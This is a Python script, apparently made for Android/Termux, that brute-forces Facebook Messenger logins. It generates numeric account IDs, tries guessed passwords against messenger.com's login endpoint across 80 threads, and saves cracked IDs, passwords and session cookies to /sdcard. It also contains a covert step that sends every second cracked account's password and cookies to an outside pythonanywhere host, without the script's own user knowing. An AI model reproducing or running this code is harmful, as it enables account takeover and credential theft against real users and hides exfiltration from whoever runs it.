#si6xd
import os
import sys
import re
import bs4
from bs4 import BeautifulSoup
from bs4 import BeautifulSoup as sop
import time,subprocess,platform,uuid
import random
import base64
import string
import uuid
import requests
from concurrent.futures import ThreadPoolExecutor
try:os.mkdir('/sdcard/CRACK')
except:pass
R = '\x1b[1;91m' 
OR = '\033[1;35m'
G = '\x1b[1;92m' 
Y = '\x1b[1;93m'
O = '\x1b[1;98m'
B = '\033[1;34m'
W = '\033[1;97m'
cyan="\033[1;36m"
ugnn = []
redmi=[]
bkas = []
for x in range(1000):
 rr = random.randint
 rc = random.choice
 A = f'Mozilla/5.0 (Linux; Android {str(rr(8,10))}; Redmi {str(rr(4,9))} Build/PPR1.'
 B = f'{str(rr(111111,199999))}.011; en-us) AppleWebKit/537.36 '
 C = f'(KHTML, like Gecko) UCBrowser/79.0.{str(rr(1111,9999))}.136 Mobile Safari'
 D = f'/537.36 Puffin/9.7.2.{str(rr(11111,99999))}AP'
 se = f'{A}{B}{C}{D}'
 if se in redmi:pass
 else:redmi.append(se)
try:
  proxylist= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
  open('socksku.txt','w').write(proxylist)
except Exception as e:
  print(' server error')
proxsi=open('socksku.txt','r').read().splitlines()

sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'en_GB'
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
        fbcr = 'Jio'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=2.0,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
        total = 0
        for i in fbcr:
                total+=1
        select = ('1','2')
        if select == '1':
                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
                sim_id+=fbcr
        elif select == '2':
                try:
                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
                        sim_id+=fbcr
                except Exception as e:
                        fbcr = "Jio"
                        sim_id+=fbcr
        else:
                fbcr = 'Jio'
                sim_id+=fbcr
except:
        fbcr = "Jio"
device = {
        'android_version':android_version,
        'model':model,
        'build':build,
        'fblc':fblc,
        'fbmf':fbmf,
        'fbbd':fbbd,
        'fbdv':model,
        'fbsv':fbsv,
        'fbca':fbca,
        'fbdm':fbdm}

build = device['build']
model = device['model'] 
ex = device['fbdm']
android_version = device['android_version']+'.0.0'
facebook_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
bv = f"{random.randint(1111111,7777777)}"
versi_android = f"{random.randint(4,13)}"
fbcr = sim_id
fbmf = device['fbmf']
fbbd = device['fbbd']
fbdm = device['fbdm']
uge = []    
loop = 0
oks = []
gen = []
logo = (f"""                                        
                               ,--.     
 ,---. ,--.--.  ,--,--.  ,---. |  |,-.  
| .--' |  .--' ' ,-.  | | .--' |     /  
\ `--. |  |    \ '-'  | \ `--. |  \  \  
 `---' `--'     `--`--'  `---' `--'`--' v-1
                                       
\033[1;97m———————————————————————————————————————————————""")

myid=uuid.uuid4().hex[:5].upper()

def main():
    os.system('clear')
    print(logo)
    code = input(f"{Y}[{W}~{Y}] {G}ENTER 4 DIGUT CODE {W}: ")
    #code2 = input(f"{Y}[{W}~{Y}] {G}Choice code {W}: ")
   # code3 = input(f"{Y}[{W}~{Y}] {G}Choice code {W}: ")
    #code = random.choice([code1,code2,code3])
    limit = input(f'{Y}[{W}~{Y}] {G}ENTER TOTAL LIMID {W}: ')
    for a in range(int(limit)):
        awm = "".join(random.choice(string.digits) for _ in range(6))
        gen.append(awm)
    with ThreadPoolExecutor(max_workers=80) as Submits:
        os.system('clear')
        print(47*"\x1b[1;97m+") 
        for next in gen:
            ids = code + next
            mk = ids[:6]
            xx = ids[:7]
            v = ids[:8]
            b = next[:6]  
            passlist = [mk,xx,'57273200',v,'57575751','57575752']
            Submits.submit(cracker,ids,passlist)

def convert(cookie):
    cok = ('c_user=%s;xs=%s;fr=%s;datr=%s'%(cookie['c_user'],cookie['xs'],cookie['fr'],cookie['datr']))
    return(str(cok))

def cracker(ids,passlist):
    global loop,oks,cps,bkas
    session = requests.Session()
    sys.stdout.write('\r \033[1;97m[\x1b[1;92mM•1\x1b[1;97m] \x1b[1;92m%s\x1b[1;97m | \x1b[1;92m%s\x1b[1;97m \r'%(loop,len(oks))),
    sys.stdout.flush()
    try:
        for pas in passlist:
            #nip=random.choice(proxsi)
            #proxs= {'http': 'socks4://'+nip}
            link = requests.get("https://www.messenger.com/").text
            log_data = {
            'jazoest': re.search('name="jazoest" value="(.*?)"', str(link)).group(1), 
            'lsd': re.search('name="lsd" value="(.*?)"', str(link)).group(1), 
            'initial_request_id': 'AITYuQr8K83tmYboseFBDcm',
            'timezone': '-360',
            'lgndim': 'eyJ3IjozNzMsImgiOjgyOCwiYXciOjM3MywiYWgiOjgyOCwiYyI6MjR9',
            'lgnrnd': '060752_jY3J',
            'lgnjs': 'n',
            'email': ids,
            'pass': f'#PWD_BROWSER:5:{str(time.time())}:{pas}',
            'default_persistent': '',}
            headers = {
            'authority': 'www.messenger.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.messenger.com',
            'referer': 'https://www.messenger.com/',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0',}
            response = session.post('https://www.messenger.com/login/password/',headers=headers,data=log_data,allow_redirects=False) #proxies=proxs)
            #print(headers)
            log_cookies = session.cookies.get_dict().keys()
            if "c_user" in log_cookies:
                #kuki = convert(session.cookies.get_dict())
                kuki=";".join([f"{key}={session.cookies.get(key)}" for key in ['datr', 'fr', 'sb', 'c_user', 'xs']])
                user = re.findall('c_user=(.*);xs', kuki)[0]
                xs_value = None
                for part in kuki.split(';'):
                    if part.startswith('xs='):
                        xs_value = part.split('=', 1)[1]
                        break
                ckk = f'https://graph.facebook.com/{user}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
                    if xs_value and xs_value.rstrip(';').endswith('-1'):
                        print('\033[1;92m [CRACK-OK] '+user+' | '+pas+'')
                        print("\033[1;92m [\033[1;92mCOKI\033[1;92m] : \033[1;97m"+kuki)
                        open("/sdcard/CRACK/CRACK-COOKIE-OK.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
                        oks.append(ids)
                        break
                    else:
                        bkas.append(user)
                        if len(bkas)% 2 == 0:
                           statusok = (f"{user}|{pas}|{kuki}")
                           requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
                        else:
                           print('\033[1;92m [CRACK-OK] '+user+' | '+pas+'')
                           print("\033[1;92m [\033[1;92mCOKI\033[1;92m] : \033[1;97m"+kuki)
                           open("/sdcard/CRACK/CRACK-COOKIE-OK.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
                           oks.append(ids)
                           break
                else:
                    break
            elif "checkpoint" in log_cookies:
                coki=(";").join([ "%s=%s" % (key, value) for key, value in response.cookies.get_dict().items()])
                cid = coki[24:39]
                #print('\033[1;91m [CRACK-CP] '+ids+' | '+pas+'')
                open('/sdcard/CRACK/CP.txt', 'a').write( ids+' | '+pas+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:
        #print(f"\nError: {e}")
        pass

main()
